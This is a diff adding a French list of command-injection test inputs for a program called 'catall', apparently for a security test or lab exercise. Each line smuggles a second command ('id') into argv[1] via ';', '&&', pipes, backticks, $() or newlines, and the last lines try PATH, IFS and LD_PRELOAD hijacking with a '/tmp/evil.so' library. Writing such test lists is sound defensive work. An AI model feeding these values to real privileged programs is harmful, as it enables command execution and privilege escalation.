@@ -1,0 +1,9 @@
+x; id -- injection de commande via ';' dans argv[1] de catall
+x && id -- injection de commande via '&&' dans argv[1] de catall
+x | id -- injection de commande via un tube dans argv[1] de catall
+`id` -- substitution de commande via accents graves dans argv[1] de catall
+$(id) -- substitution de commande via $() dans argv[1] de catall
+x\nid -- injection de commande via saut de ligne dans argv[1] de catall
+PATH=<dir>:$PATH avec argv[1]="x; id" -- detournement de la variable PATH pour substituer la commande injectee
+IFS='/' avant l'invocation de catall -- tentative de detournement via la variable IFS
+LD_PRELOAD=/tmp/evil.so ./catall somefile -- tentative de detournement de l'editeur de liens dynamique
